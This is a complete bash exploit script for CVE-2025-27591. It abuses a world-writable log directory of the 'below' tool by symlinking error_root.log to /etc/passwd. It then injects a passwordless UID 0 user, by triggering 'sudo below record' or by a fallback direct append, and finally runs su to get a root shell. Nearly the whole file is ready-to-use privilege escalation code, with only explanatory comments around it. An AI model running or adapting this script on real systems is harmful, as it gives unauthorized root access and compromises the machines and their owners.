#!/bin/bash

#==============================================================================
# CVE-2025-27591 Exploit - Symlink Attack on 'below' Logger
# This script exploits a symlink vulnerability in the 'below' logging system
# to inject a root user into /etc/passwd
#==============================================================================

# Configuration variables
BINARY="/usr/bin/below"
LOG_DIR="/var/log/below"
TARGET_LOG="${LOG_DIR}/error_root.log"
TMP_PAYLOAD="/tmp/exploit_payload"

# User-configurable username (will be set at runtime)
USERNAME=""
MALICIOUS_LINE=""

#==============================================================================
# HELPER FUNCTIONS
#==============================================================================

# Check if a directory/file is world-writable (other users can write to it)
# Returns 0 (true) if world-writable, 1 (false) otherwise
check_world_writable() {
    local path="$1"
    local perms=$(stat -c "%a" "$path" 2>/dev/null)
    [[ -z "$perms" ]] && return 1

    # Check the last digit of permissions (other permissions)
    local other_write=${perms:2:1}
    [[ $other_write -eq 2 ]] || [[ $other_write -eq 3 ]] || [[ $other_write -eq 6 ]] || [[ $other_write -eq 7 ]]
}

# Check if a path is a symbolic link
is_symlink() {
    [[ -L "$1" ]]
}

# Remove existing target log file if it exists
cleanup_target_log() {
    if [[ -e "$TARGET_LOG" ]] || [[ -L "$TARGET_LOG" ]]; then
        echo "[*] Cleaning up existing $TARGET_LOG"
        rm -f "$TARGET_LOG" 2>/dev/null || {
            echo "[-] Failed to remove $TARGET_LOG"
            return 1
        }
    fi
    return 0
}

#==============================================================================
# VULNERABILITY CHECK
#==============================================================================

# Check if the target system is vulnerable to CVE-2025-27591
# Verifies:
#   1. Log directory exists
#   2. Log directory is world-writable
#   3. We can create symlinks in that directory
check_vulnerability() {
    echo "[*] Checking for CVE-2025-27591 vulnerability"

    # Check if log directory exists
    if [[ ! -d "$LOG_DIR" ]]; then
        echo "[-] Log directory $LOG_DIR does not exist"
        return 1
    fi

    # Check if log directory is world-writable (required for symlink creation)
    if ! check_world_writable "$LOG_DIR"; then
        echo "[-] $LOG_DIR is not world-writable"
        return 1
    fi
    echo "[+] $LOG_DIR is world-writable"

    # Handle existing target log file
    if [[ -e "$TARGET_LOG" ]]; then
        if is_symlink "$TARGET_LOG"; then
            echo "[+] $TARGET_LOG is already a symlink"
            local target=$(readlink "$TARGET_LOG")

            # If symlink points to wrong target, recreate it
            if [[ "$target" != "/etc/passwd" ]]; then
                echo "[*] Symlink points to wrong target, recreating"
                cleanup_target_log || return 1
            fi
        else
            # If it's a regular file, remove it
            echo "[*] $TARGET_LOG is a regular file, removing"
            cleanup_target_log || return 1
        fi
    fi

    # Test if we can create symlinks
    echo "[*] Testing symlink creation"
    if ! ln -s /etc/passwd "$TARGET_LOG" 2>/dev/null; then
        echo "[-] Failed to create symlink"
        return 1
    fi
    echo "[+] Symlink test successful"

    # Clean up test symlink
    rm -f "$TARGET_LOG"
    return 0
}

#==============================================================================
# PAYLOAD CHECK
#==============================================================================

# Check if our malicious user has already been injected into /etc/passwd
check_passwd_injection() {
    grep -q "^${USERNAME}:" /etc/passwd 2>/dev/null
}

#==============================================================================
# PROCESS MANAGEMENT
#==============================================================================

# Safely kill all 'below' processes
kill_below_safely() {
    pkill -9 below 2>/dev/null
    sleep 1

    # Double-check and use sudo if needed
    if pgrep below > /dev/null 2>&1; then
        sudo pkill -9 below 2>/dev/null
    fi
}

#==============================================================================
# EXPLOITATION
#==============================================================================

# Main exploitation function
# Steps:
#   1. Create payload file
#   2. Create symlink pointing to /etc/passwd
#   3. Trigger 'below record' to write to the symlink
#   4. Verify payload injection
#   5. Spawn root shell
exploit() {
    echo "[*] Starting exploitation"

    # Step 1: Write malicious passwd line to temporary file
    echo "$MALICIOUS_LINE" > "$TMP_PAYLOAD"
    echo "[+] Wrote payload to $TMP_PAYLOAD"

    # Step 2: Clean up any existing target log
    cleanup_target_log

    # Step 3: Create symlink pointing error_root.log -> /etc/passwd
    echo "[*] Creating symlink: $TARGET_LOG -> /etc/passwd"
    if ! ln -s /etc/passwd "$TARGET_LOG" 2>/dev/null; then
        echo "[-] Failed to create symlink"
        return 1
    fi
    echo "[+] Symlink created"

    # Verify symlink was created successfully
    if ! is_symlink "$TARGET_LOG"; then
        echo "[-] Symlink verification failed"
        return 1
    fi

    # Step 4: Execute 'below record' to trigger logging to symlinked file
    # This should cause 'below' to write error messages to /etc/passwd
    echo "[*] Executing 'sudo below record' to trigger logging"

    sudo "$BINARY" record &
    local below_pid=$!
    echo "[*] Started 'below record' with PID: $below_pid"

    # Let it run for 3 seconds to trigger error logging
    sleep 3

    # Kill the below process
    if ps -p $below_pid > /dev/null 2>&1; then
        echo "[*] Killing 'below record' process"
        sudo kill -9 $below_pid 2>/dev/null
        wait $below_pid 2>/dev/null
    fi

    sleep 1
    kill_below_safely

    # Step 5: Check if payload was written during 'below record'
    echo "[*] Checking if payload was written"
    if check_passwd_injection; then
        echo "[+] Exploitation successful via 'below record'"
    else
        # Fallback: Try manual injection if 'below record' didn't work
        echo "[*] Attempting manual injection"

        if [[ -L "$TARGET_LOG" ]]; then
            echo "[*] Appending payload to /etc/passwd via symlink"

            # Try direct append
            if echo "$MALICIOUS_LINE" >> "$TARGET_LOG" 2>/dev/null; then
                echo "[+] Payload appended"
            else
                # Fallback to using sudo tee
                echo "[*] Trying alternative method with tee"
                if echo "$MALICIOUS_LINE" | sudo tee -a "$TARGET_LOG" > /dev/null 2>&1; then
                    echo "[+] Payload appended via tee"
                else
                    echo "[-] All injection methods failed"
                    return 1
                fi
            fi
        else
            echo "[-] Symlink was removed or replaced"
            return 1
        fi
    fi

    sleep 1

    # Final verification
    if ! check_passwd_injection; then
        echo "[-] Payload verification failed"
        return 1
    fi

    # Step 6: Spawn root shell using our new user
    echo "[+] Exploitation completed! Payload is in /etc/passwd"
    echo "[*] Spawning root shell via 'su $USERNAME'"
    echo "[*] Password should be empty, just press Enter"

    # Disable trap before spawning shell to prevent cleanup
    trap - EXIT SIGINT SIGTERM

    exec su "$USERNAME"
}

#==============================================================================
# CLEANUP
#==============================================================================

# Cleanup function called on failure or interruption
cleanup_on_fail() {
    echo "[*] Cleaning up after failure"

    # Remove symlink if it exists
    [[ -L "$TARGET_LOG" ]] && rm -f "$TARGET_LOG" 2>/dev/null

    # Kill any remaining below processes
    kill_below_safely

    # Warn if malicious user was created
    if grep -q "^${USERNAME}:" /etc/passwd 2>/dev/null; then
        echo "[!] Malicious user '$USERNAME' found in /etc/passwd"
        echo "[*] To cleanup, run: sudo sed -i '/^${USERNAME}:/d' /etc/passwd"
    fi
}

#==============================================================================
# USER INPUT
#==============================================================================

# Prompt user for desired username
get_username() {
    echo "========================================"
    echo "  CVE-2025-27591 Exploit (Bash)"
    echo "========================================"
    echo
    echo "[*] This exploit will create a new root user in /etc/passwd"
    echo -n "[?] Enter username for the new root user (default: 0xdtc): "
    read -r USERNAME

    # Use default if user just pressed Enter
    if [[ -z "$USERNAME" ]]; then
        USERNAME="0xdtc"
    fi

    echo "[+] Using username: $USERNAME"

    # Build the malicious passwd line
    # Format: username::UID:GID:comment:home:shell
    # UID=0 and GID=0 means root privileges
    # Empty password field (::) means no password required
    MALICIOUS_LINE="${USERNAME}::0:0:${USERNAME}:/root:/bin/bash"

    echo
}

#==============================================================================
# MAIN
#==============================================================================

main() {
    # Get username from user
    get_username

    # Check if system is vulnerable
    if ! check_vulnerability; then
        echo "[-] Target does not appear vulnerable"
        exit 1
    fi

    echo "[+] Target is vulnerable"
    echo

    # Check if payload already exists (re-run scenario)
    if check_passwd_injection; then
        echo "[+] Payload already exists! Spawning shell"
        # Disable trap before spawning shell to prevent cleanup
        trap - EXIT SIGINT SIGTERM
        exec su "$USERNAME"
        exit 0
    fi

    # Run the exploit
    if ! exploit; then
        echo "[-] Exploitation failed"
        cleanup_on_fail
        exit 1
    fi
}

# Set up trap to cleanup on exit/interrupt
trap cleanup_on_fail EXIT SIGINT SIGTERM

# Execute main function
main "$@"